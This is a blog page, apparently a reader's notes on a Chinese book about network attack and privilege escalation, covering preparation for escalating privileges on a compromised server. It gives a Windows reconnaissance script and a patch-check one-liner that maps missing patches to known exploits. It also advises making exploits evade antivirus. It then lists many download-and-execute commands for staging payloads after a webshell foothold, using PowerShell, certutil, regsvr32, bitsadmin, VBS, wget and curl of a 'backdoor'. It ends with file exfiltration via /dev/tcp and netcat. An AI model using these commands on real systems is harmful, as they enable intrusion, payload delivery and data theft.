@@ -1,0 +1,763 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="make changes, make perfect">
+  <meta name="author" content="Dr34d">
+  <meta name="keywords" content="blog">
+  <title>《网络攻防实战研究：漏洞利用与提权》笔记——提权准备工作 - Dr34d&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/xt256.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"greydr34d.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Dr34d's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Dr34d's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/root_banner.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="《网络攻防实战研究：漏洞利用与提权》笔记——提权准备工作">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-03-15 23:40" pubdate>
+        2021年3月15日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      35
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">《网络攻防实战研究：漏洞利用与提权》笔记——提权准备工作</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：7 天前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>本菜鸡准备研读《网络攻防实战研究：漏洞利用与提权》这本宝典，太感动了，前辈们写的通俗易懂、由浅入深。书中的理论知识很大程度上扩展了我的渗透思路，使我受益颇丰，笔者在此记录书中内容的同时，也记录研读时的不懂之处，查阅多方资料，对要点进行补充。人菜就要多读书~~。</p>
+<blockquote>
+<p>提权是整个黑客攻防过程中  难的一个环节。对渗透来说，获取的权限越高，控制的服务器权限越多，也就越有成就感。在整个渗透流程中，提权过程汇聚了思路、技巧、工具和技术。高楼大厦总是需要坚实的地基，在渗透过程中，基础越扎实，就越容易取得   终的胜利。</p>
+<p>——《网络攻防实战研究：漏洞利用与提权》</p>
+</blockquote>
+<h1 id="0x02-提权准备工作"><a href="#0x02-提权准备工作" class="headerlink" title="0x02 提权准备工作"></a>0x02 提权准备工作</h1><h2 id="1-对目标服务器进行信息收集"><a href="#1-对目标服务器进行信息收集" class="headerlink" title="1. 对目标服务器进行信息收集"></a>1. 对目标服务器进行信息收集</h2><blockquote>
+<p>（1）目标服务器信息的收集利用已有权限或者条件，对需要提权的目标服务器进行信息收集，例如在有 WebShell 等的情况</p>
+</blockquote>
+<p>下执行命令获取 Windows 操作系统的信息。 </p>
+<ul>
+<li><p>systeminfo：获取操作系统类型、版本、位数等信息。</p>
+</li>
+<li><p>ipconfig /all：获取是否为独立 IP 地址、DNS、计算机名称等信息。</p>
+</li>
+<li><p>net user：当前用户信息。</p>
+</li>
+<li><p>whoami：当前用户权限。</p>
+</li>
+<li><p>netstat-an：当前端口开放情况。收集系统信息的一个脚本程序如下。</p>
+</li>
+</ul>
+<p>收集系统信息的一个脚本程序如下</p>
+<div class="hljs code-wrapper"><pre><code class="hljs bat">@<span class="hljs-built_in">echo</span> off 
+<span class="hljs-built_in">echo</span> #########system info collection 
+systeminfo 
+<span class="hljs-built_in">ver</span> 
+hostname 
+<span class="hljs-built_in">net</span> user 
+<span class="hljs-built_in">net</span> localgroup 
+<span class="hljs-built_in">net</span> localgroup administrators 
+<span class="hljs-built_in">net</span> user guest 
+<span class="hljs-built_in">net</span> user administrator 
+<span class="hljs-built_in">echo</span> #######<span class="hljs-built_in">at</span>- with atq##### 
+<span class="hljs-built_in">echo</span> schtask /query 
+<span class="hljs-built_in">echo</span> 
+<span class="hljs-built_in">echo</span> ####task-list############# 
+tasklist /svc 
+<span class="hljs-built_in">echo</span> 
+<span class="hljs-built_in">echo</span> ####<span class="hljs-built_in">net</span>-work infomation 
+<span class="hljs-built_in">ipconfig</span>/all 
+route <span class="hljs-built_in">print</span> 
+arp -a 
+netstat -anipconfig /displaydns 
+<span class="hljs-built_in">echo</span> 
+<span class="hljs-built_in">echo</span> #######service############ 
+sc query <span class="hljs-built_in">type</span>= service state= all 
+<span class="hljs-built_in">echo</span> #######file-############## 
+<span class="hljs-built_in">cd</span> \ 
+<span class="hljs-built_in">tree</span> –F</code></pre></div>
+
+
+
+<h2 id="2-收集目标服务器漏洞补丁情况"><a href="#2-收集目标服务器漏洞补丁情况" class="headerlink" title="2. 收集目标服务器漏洞补丁情况"></a>2. 收集目标服务器漏洞补丁情况</h2><blockquote>
+<p>（2）准备提权服务器的漏洞补丁情况收集</p>
+</blockquote>
+<div class="hljs code-wrapper"><pre><code class="hljs bat">systeminfo&gt;C:\Windows\Temp\temp.txt&amp;(<span class="hljs-keyword">for</span> %i <span class="hljs-keyword">in</span> (KB977165 KB970483 KB3057191 KB3079904 KB3077657 KB3045171 KB2840221 KB3000061 KB2850851 KB2707511 KB2711167 KB2124261 KB2360937 KB2478960 KB2507938 KB2566454 KB2646524 KB2645640 KB2641653 KB944653 KB952004 KB971657 KB2620712 KB2393802 KB942831 KB2503665 KB2592799 KB956572 KB977165 KB2621440 KB3124280 KB3143141 KB3134228) <span class="hljs-keyword">do</span> @<span class="hljs-built_in">type</span> C:\Windows\Temp\ temp.txt|@<span class="hljs-built_in">find</span> /i &quot;%i&quot;|| @<span class="hljs-built_in">echo</span> %i <span class="hljs-keyword">Not</span> Installed!)&amp;<span class="hljs-built_in">del</span> /f /q /a C:\Windows\Temp\temp.txt</code></pre></div>
+
+<p>补丁号对应的可供利用的程序名称列举如下。</p>
+<ul>
+<li> KB2360937：MS10-084。  </li>
+<li> KB2478960：MS11-014。</li>
+<li> KB2507938：MS11-056。 </li>
+<li> KB2566454：MS11-062。  </li>
+<li> KB2646524：MS12-003。</li>
+<li> KB2645640：MS12-009。 </li>
+<li> KB2641653：MS12-018。 </li>
+<li> KB944653：MS07-067。 </li>
+<li> KB952004：MS09-012 PR。 </li>
+<li> KB971657：MS09-041。 </li>
+<li> KB2620712：MS11-097。  </li>
+<li> KB2393802：MS11-011。 </li>
+<li> KB942831：MS08-005。</li>
+<li> KB2503665：MS11-046。 </li>
+<li> KB2592799：MS11-080。 </li>
+<li> KB956572：MS09-012 烤肉。 </li>
+<li> KB2621440：MS12-020。 </li>
+<li> KB977165：MS10-015 Ms Viru。</li>
+<li> KB3124280：MS16-032。 </li>
+<li> KB3143141：MS16-016。 </li>
+<li> KB3134228：MS16-014。 </li>
+<li> KB3079904：MS15-097。 </li>
+<li> KB3077657：MS15-077。 </li>
+<li> KB3045171：MS15-051。 </li>
+<li> KB3000061：MS14-058。 </li>
+<li> KB2829361：MS13-046。 </li>
+<li> KB2850851：MS13-053 EPATHOBJ 0day（限 32 位）。</li>
+<li> KB2707511：MS12-042 sysret –pid。</li>
+<li> KB2124261 和 KB2271195：MS10-065 IIS7。</li>
+<li> KB970483：MS09-020 IIS6。</li>
+</ul>
+<h2 id="3-准备提权-0day-及其他相关工具"><a href="#3-准备提权-0day-及其他相关工具" class="headerlink" title="3. 准备提权 0day 及其他相关工具"></a>3. 准备提权 0day 及其他相关工具</h2><blockquote>
+<p>针对当前操作系统准备 32 位或 64 位提权 0day。针对当前操作系统应用程序准备提权 0day。准 备获取密码的 Hash 工具，并对 0day 及其相关工具进行免杀处理和测试。</p>
+</blockquote>
+<h2 id="4-寻找服务器可写目录"><a href="#4-寻找服务器可写目录" class="headerlink" title="4. 寻找服务器可写目录"></a>4. 寻找服务器可写目录</h2><p>在目标服务器中找到一个可写目录。</p>
+<h1 id="0x03-实施提权"><a href="#0x03-实施提权" class="headerlink" title="0x03 实施提权"></a>0x03 实施提权</h1><h2 id="1-上传或者下载提权-0day-和相关工具"><a href="#1-上传或者下载提权-0day-和相关工具" class="headerlink" title="1. 上传或者下载提权 0day 和相关工具"></a>1. 上传或者下载提权 0day 和相关工具</h2><blockquote>
+<p>将文件上传到服务器有多种方式，例如通过 WebShell、FTP、下载命令等将工具上传到系统的 可写目录下。一些可供参考的下载方法如下。</p>
+</blockquote>
+<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><h4 id="使用-vbs-下载"><a href="#使用-vbs-下载" class="headerlink" title="使用 vbs 下载"></a>使用 vbs 下载</h4><div class="hljs code-wrapper"><pre><code class="hljs vbscript">iLocal = <span class="hljs-built_in">LCase</span>(WScript.Arguments(<span class="hljs-number">1</span>)) 
+iRemote = <span class="hljs-built_in">LCase</span>(WScript.Arguments(<span class="hljs-number">0</span>)) 
+<span class="hljs-keyword">Set</span> xPost = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>) 
+xPost.Open <span class="hljs-string">&quot;GET&quot;</span>,iRemote,<span class="hljs-number">0</span> 
+xPost.Send() 
+<span class="hljs-keyword">Set</span> sGet = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>) 
+sGet.Mode = <span class="hljs-number">3</span> 
+sGet.Type = <span class="hljs-number">1</span> 
+sGet.Open() 
+sGet.Write(xPost.responseBody) 
+sGet.SaveToFile iLocal,<span class="hljs-number">2</span></code></pre></div>
+
+<p>使用命令“cscript down.vbs <a target="_blank" rel="noopener" href="http://www.antian365.com/ma.exe">http://www.antian365.com/ma.exe</a> c:/ma.exe”，将 ma.exe 保存到 C 盘 根目录下，不写路径则会显示程序执行出错。</p>
+<p>固定下载程序位置和名称并下载，代码如下。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs vbscript">url = <span class="hljs-string">&quot;http:// www.antian365.com /ma.exe&quot;</span> <span class="hljs-comment">&#x27;网络上的文件地址</span>
+saveas = <span class="hljs-string">&quot;c:\ma.exe&quot;</span> <span class="hljs-comment">&#x27;保存的本地文件</span>
+<span class="hljs-keyword">Set</span> xmlhttp = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>) <span class="hljs-comment">&#x27;创建 HTTP 请求对象</span>
+<span class="hljs-keyword">Set</span> stream = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>) <span class="hljs-comment">&#x27;创建 ADO 数据流对象</span>
+<span class="hljs-keyword">Call</span> xmlhttp.open(<span class="hljs-string">&quot;GET&quot;</span>,url,<span class="hljs-literal">False</span>) <span class="hljs-comment">&#x27;打开连接</span>
+<span class="hljs-keyword">Call</span> xmlhttp.send() <span class="hljs-comment">&#x27;发送请求</span>
+stream.mode = <span class="hljs-number">3</span> <span class="hljs-comment">&#x27;设置数据流为读写模式</span>
+stream.type = <span class="hljs-number">1</span> <span class="hljs-comment">&#x27;设置数据流为二进制模式</span>
+<span class="hljs-keyword">Call</span> stream.open() <span class="hljs-comment">&#x27;打开数据流</span>
+<span class="hljs-keyword">Call</span> stream.write(xmlhttp.responsebody) <span class="hljs-comment">&#x27;将服务器的返回报文主体内容写入数据流</span>
+<span class="hljs-keyword">Call</span> stream.savetofile(saveas,<span class="hljs-number">2</span>) <span class="hljs-comment">&#x27;将数据流保存为文件</span>
+<span class="hljs-keyword">Set</span> xmlhttp = <span class="hljs-literal">Nothing</span> 
+<span class="hljs-keyword">Set</span> stream = <span class="hljs-literal">Nothing</span></code></pre></div>
+
+<p>将以上代码保存为 down.vbs 文件，执行“cscript down.vbs”命令即可下载程序 ma.exe 到 C 盘中。</p>
+<p>另外一种下载文件的方法，代码如下。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs vbscript"><span class="hljs-keyword">Set</span> xPost = <span class="hljs-built_in">createObject</span>(<span class="hljs-string">&quot;Microsoft.XMLHTTP&quot;</span>) 
+xPost.Open <span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot; http:// www.antian365.com /ma.exe &quot;</span>,<span class="hljs-number">0</span> <span class="hljs-comment">&#x27;下载文件的地址</span>
+xPost.Send() 
+<span class="hljs-keyword">Set</span> sGet = <span class="hljs-built_in">createObject</span>(<span class="hljs-string">&quot;ADODB.Stream&quot;</span>) 
+sGet.Mode = <span class="hljs-number">3</span> 
+sGet.Type = <span class="hljs-number">1</span> 
+sGet.Open() 
+sGet.Write(xPost.responseBody) 
+sGet.SaveToFile <span class="hljs-string">&quot;c:\2.exe&quot;</span>,<span class="hljs-number">2</span> <span class="hljs-comment">&#x27;保存文件的路径和文件名</span></code></pre></div>
+
+
+
+
+
+<h4 id="使用-powershell-下载"><a href="#使用-powershell-下载" class="headerlink" title="使用 powershell 下载"></a>使用 powershell 下载</h4><p>下载并执行:</p>
+<div class="hljs code-wrapper"><pre><code class="hljs powershell">powershell (<span class="hljs-built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://1.2.3.4/5.exe&#x27;</span>,<span class="hljs-string">&#x27;c:\download\a.exe&#x27;</span>);<span class="hljs-built_in">start-process</span> <span class="hljs-string">&#x27;c:\download\a.exe&#x27;</span></code></pre></div>
+
+
+
+<h4 id="Perl文件下载"><a href="#Perl文件下载" class="headerlink" title="Perl文件下载"></a>Perl文件下载</h4><p>Perl是一种用途非常广泛的脚本语言，几乎可以用于任何东西。使用Perl可以非常轻松地将文件下载到本地主机上。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/perl </span>
+<span class="hljs-keyword">use</span> LWP::Simple; 
+getstore(<span class="hljs-string">&quot;http://domain/file&quot;</span>, <span class="hljs-string">&quot;file&quot;</span>);</code></pre></div>
+
+<p>perl test.pl</p>
+<h4 id="Python文件下载"><a href="#Python文件下载" class="headerlink" title="Python文件下载"></a>Python文件下载</h4><p>Python是一种通用的脚本语言，强调代码的可读性。与大多数脚本语言一样，目标是编写的代码少于编程语言所需的代码，同时仍能完成预期的任务。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span>
+<span class="hljs-keyword">import</span> urllib2 
+u = urllib2.urlopen(<span class="hljs-string">&#x27;http://domain/file&#x27;</span>) 
+localFile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;local_file&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) 
+localFile.write(u.read()) 
+localFile.close()</code></pre></div>
+
+
+
+
+
+<h4 id="Ruby文件下载"><a href="#Ruby文件下载" class="headerlink" title="Ruby文件下载"></a>Ruby文件下载</h4><p>Ruby是一种面向对象的编程语言，可用于许多事情，从创建框架（例如Metasploit）到简单的任务（例如下载文件）。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-meta">#!/usr/bin/ruby</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;net/http&#x27;</span> 
+Net::HTTP.start(<span class="hljs-string">&quot;www.domain.com&quot;</span>) &#123; 
+    <span class="hljs-params">|http|</span> r = http.get(<span class="hljs-string">&quot;/file&quot;</span>) 
+    open(<span class="hljs-string">&quot;save_location&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) &#123; 
+        <span class="hljs-params">|file|</span> file.write(r.body) 
+        &#125; 
+    &#125;</code></pre></div>
+
+<p>ruby test.rb</p>
+<h4 id="PHP文件下载"><a href="#PHP文件下载" class="headerlink" title="PHP文件下载"></a>PHP文件下载</h4><p>PHP通常是用于Web开发的服务器端脚本语言，但也可以用作通用脚本语言。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">#!/usr/bin/php </span>
+<span class="hljs-meta">&lt;?php</span>         
+	<span class="hljs-variable">$data</span> = @file(<span class="hljs-string">&quot;http://example.com/file&quot;</span>);         
+	<span class="hljs-variable">$lf</span> = <span class="hljs-string">&quot;local_file&quot;</span>;         
+	<span class="hljs-variable">$fh</span> = fopen(<span class="hljs-variable">$lf</span>, <span class="hljs-string">&#x27;w&#x27;</span>);         
+	fwrite(<span class="hljs-variable">$fh</span>, <span class="hljs-variable">$data</span>[<span class="hljs-number">0</span>]);         
+	fclose(<span class="hljs-variable">$fh</span>); 
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>php test.php</p>
+<h4 id="使用-bitsadmin-命令下载文件"><a href="#使用-bitsadmin-命令下载文件" class="headerlink" title="使用 bitsadmin 命令下载文件"></a>使用 bitsadmin 命令下载文件</h4><p>第一种方式，代码如下。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs cmd">bitsadmin /transfer myjob1 /download /priority normal http://antian365.com/psexec.exe c:\psexec.exe</code></pre></div>
+
+<p>第二种方式，代码如下。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs cmd">bitsadmin /rawreturn /transfer getfile http://sysinternals.com/files/PSTools.zip c:\p.zip</code></pre></div>
+
+<p>第三种方式，代码如下。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs cmd">bitsadmin /rawreturn /transfer getpayload http://sysinternals.com/files/PSTools.zip c:\p.zip</code></pre></div>
+
+<p>第四种方式，代码如下。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs cmd">bitsadmin /transfer myDownLoadJob /download /priority normal &quot;http://download.sysinternals.com/files/PSTools.zip&quot; &quot;c:\p.zip&quot;</code></pre></div>
+
+
+
+<h4 id="在-bat-模式下执行-vbs-下载"><a href="#在-bat-模式下执行-vbs-下载" class="headerlink" title="在 bat 模式下执行 vbs 下载"></a>在 bat 模式下执行 vbs 下载</h4><div class="hljs code-wrapper"><pre><code class="hljs bat"><span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> xPost = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;<span class="hljs-number">1</span>.vbs 
+<span class="hljs-built_in">echo</span> xPost.Open &quot;GET&quot;,&quot;http://<span class="hljs-number">58</span>.<span class="hljs-number">54</span>.<span class="hljs-number">99</span>.<span class="hljs-number">22</span>:<span class="hljs-number">8080</span>/<span class="hljs-built_in">help</span>.exe&quot;,<span class="hljs-number">0</span> &gt;&gt;<span class="hljs-number">1</span>.vbs 
+<span class="hljs-built_in">echo</span> xPost.Send() &gt;&gt;<span class="hljs-number">1</span>.vbs 
+<span class="hljs-built_in">echo</span> <span class="hljs-built_in">Set</span> sGet = CreateObject(&quot;ADODB.Stream&quot;) &gt;&gt;<span class="hljs-number">1</span>.vbs 
+<span class="hljs-built_in">echo</span> sGet.<span class="hljs-built_in">Mode</span> = <span class="hljs-number">3</span> &gt;&gt;<span class="hljs-number">1</span>.vbs 
+<span class="hljs-built_in">echo</span> sGet.<span class="hljs-built_in">Type</span> = <span class="hljs-number">1</span> &gt;&gt;<span class="hljs-number">1</span>.vbs 
+<span class="hljs-built_in">echo</span> sGet.Open() &gt;&gt;<span class="hljs-number">1</span>.vbs 
+<span class="hljs-built_in">echo</span> sGet.Write(xPost.responseBody) &gt;&gt;<span class="hljs-number">1</span>.vbs 
+<span class="hljs-built_in">echo</span> sGet.SaveToFile &quot;<span class="hljs-built_in">help</span>.exe&quot;,<span class="hljs-number">2</span> &gt;&gt;<span class="hljs-number">1</span>.vbs</code></pre></div>
+
+
+
+<h4 id="在-FTP-命令模式下下载。"><a href="#在-FTP-命令模式下下载。" class="headerlink" title="在 FTP 命令模式下下载。"></a>在 FTP 命令模式下下载。</h4><p>down.bat 内容如下。</p>
+<div class="hljs code-wrapper"><pre><code class="hljs bat">@<span class="hljs-built_in">echo</span> off 
+@<span class="hljs-built_in">set</span> temp=C:\script.txt 
+<span class="hljs-built_in">echo</span> open <span class="hljs-number">10</span>.<span class="hljs-number">229</span>.<span class="hljs-number">23</span>.<span class="hljs-number">77</span>&gt;&gt;<span class="hljs-variable">%temp%</span> 
+<span class="hljs-built_in">echo</span> ftpuser&gt;&gt;<span class="hljs-variable">%temp%</span> 
+<span class="hljs-built_in">echo</span> ftpuser&gt;&gt;<span class="hljs-variable">%temp%</span> 
+<span class="hljs-built_in">echo</span> <span class="hljs-built_in">cd</span> General&gt;&gt;<span class="hljs-variable">%temp%</span> 
+<span class="hljs-built_in">echo</span> lcd <span class="hljs-variable">%2&gt;&gt;%</span>temp% 
+<span class="hljs-built_in">echo</span> get <span class="hljs-variable">%1&gt;&gt;%</span>temp% 
+<span class="hljs-built_in">echo</span> quit&gt;&gt;<span class="hljs-variable">%temp%</span> 
+@ftp -s:<span class="hljs-variable">%temp%</span> 
+<span class="hljs-built_in">del</span> <span class="hljs-variable">%temp%</span></code></pre></div>
+
+<p>执行命令“down.bat filename C:\”，参数 1 是要下载的文件名，参数 2 是下载的目标路径。使用 同样的方法也可以实现文件上传。</p>
+<h4 id="TFTP文件下载"><a href="#TFTP文件下载" class="headerlink" title="TFTP文件下载"></a>TFTP文件下载</h4><p>Windows Vista和更低版本中默认情况下带有琐碎的FTP。请注意，您将必须设置要连接的相应服务器。可以使用以下命令运行它：</p>
+<h4 id="使用-certutil"><a href="#使用-certutil" class="headerlink" title="使用 certutil"></a>使用 certutil</h4><p>下载并执行:</p>
+<div class="hljs code-wrapper"><pre><code class="hljs cmd">certutil -urlcache -split -f http://<span class="hljs-number">1</span>.<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.<span class="hljs-number">4</span>/<span class="hljs-number">5</span>.exe c:\download\a.exe&amp;&amp;c:\download\a.exe</code></pre></div>
+
+
+
+<h4 id="使用-regsvr32"><a href="#使用-regsvr32" class="headerlink" title="使用 regsvr32"></a>使用 regsvr32</h4><div class="hljs code-wrapper"><pre><code class="hljs awk">regsvr32 <span class="hljs-regexp">/u /</span>s <span class="hljs-regexp">/i:http:/</span><span class="hljs-regexp">/1.2.3.4/</span><span class="hljs-number">5</span>.exe scrobj.dll</code></pre></div>
+
+
+
+<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><h4 id="使用-wget（linux）"><a href="#使用-wget（linux）" class="headerlink" title="使用 wget（linux）"></a>使用 wget（linux）</h4><p>在 Linux 下，通过“wget <a target="_blank" rel="noopener" href="http://www.antian365.com/shell.txt%E2%80%9D%E5%91%BD%E4%BB%A4%E4%B8%8B%E8%BD%BD">http://www.antian365.com/shell.txt”命令下载</a> shell.txt 文件到本地服务器。 </p>
+<h4 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h4><div class="hljs code-wrapper"><pre><code class="hljs awk">curl http:<span class="hljs-regexp">//</span><span class="hljs-number">1.2</span>.<span class="hljs-number">3.4</span>/backdoor</code></pre></div>
+
+
+
+<h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><div class="hljs code-wrapper"><pre><code class="hljs bash">awk <span class="hljs-string">&#x27;BEGIN &#123;</span>
+<span class="hljs-string">  RS = ORS = &quot;\r\n&quot;</span>
+<span class="hljs-string">  HTTPCon = &quot;/inet/tcp/0/127.0.0.1/1337&quot;</span>
+<span class="hljs-string">  print &quot;GET /secret.txt HTTP/1.1\r\nConnection: close\r\n&quot;    |&amp; HTTPCon</span>
+<span class="hljs-string">  while (HTTPCon |&amp; getline &gt; 0)</span>
+<span class="hljs-string">      print $0</span>
+<span class="hljs-string">  close(HTTPCon)</span>
+<span class="hljs-string">&#125;&#x27;</span></code></pre></div>
+
+
+
+
+
+
+
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="使用-Bash-dev-tcp-进行文件传输"><a href="#使用-Bash-dev-tcp-进行文件传输" class="headerlink" title="使用 Bash /dev/tcp 进行文件传输"></a>使用 Bash /dev/tcp 进行文件传输</h4><p>文件接收端:</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">nc -lvnp 1337 &gt; secret.txt</code></pre></div>
+
+<p>文件发送端:</p>
+<div class="hljs code-wrapper"><pre><code class="hljs sh">cat secret.txt &gt; /dev/tcp/ip/port</code></pre></div>
+
+
+
+<h4 id="使用-NetCat-进行文件传输"><a href="#使用-NetCat-进行文件传输" class="headerlink" title="使用 NetCat 进行文件传输"></a>使用 NetCat 进行文件传输</h4><p>接受端:</p>
+<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p <span class="hljs-number">1337</span> &gt; <span class="hljs-number">1</span>.txt</code></pre></div>
+
+<p>发送端：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> <span class="hljs-number">1</span>.txt | nc -l -p <span class="hljs-number">1337</span></code></pre></div>
+
+<p>或者</p>
+<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> <span class="hljs-number">10.10.10.200</span> <span class="hljs-number">1337</span> &lt; <span class="hljs-number">1</span>.txt</code></pre></div>
+
+<p>在极端环境下，如果接受端没有 nc 可以使用 Bash 的 /dev/tcp 接收文件:</p>
